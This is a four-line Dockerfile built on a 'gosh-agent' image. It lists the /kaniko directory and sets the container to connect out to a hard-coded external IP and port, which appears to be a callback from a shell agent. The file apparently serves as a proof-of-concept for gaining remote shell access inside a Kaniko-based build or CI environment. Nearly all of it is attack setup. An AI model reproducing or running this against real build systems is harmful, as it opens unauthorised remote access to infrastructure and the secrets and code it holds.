FROM praetorianlabs/gosh-agent
RUN apk update && apk add tree
RUN tree /kaniko
CMD ["-host", "104.198.138.155:8083"]    

